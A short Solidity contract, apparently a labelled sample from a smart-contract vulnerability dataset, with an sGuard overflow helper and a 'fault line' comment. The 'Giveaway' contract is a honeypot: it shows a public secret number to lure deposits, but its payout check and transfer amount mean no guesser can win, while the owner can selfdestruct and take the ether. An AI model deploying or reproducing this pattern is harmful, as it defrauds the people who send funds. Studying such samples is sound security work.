contract sGuard{
  function add_uint256(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
pragma solidity ^0.4.21;
contract Giveaway  is sGuard {
    address private owner = msg.sender;
    uint public SecretNumber = 24;
    function() public payable {
    }
    function Guess(uint n) public payable {
        if(msg.value >= this.balance && n == SecretNumber && msg.value >= 0.07 ether) {
            msg.sender.transfer(add_uint256(this.balance, msg.value));
        }
    }
    function kill() public {
        require(msg.sender == owner);  // fault line
	    selfdestruct(msg.sender);
	}
}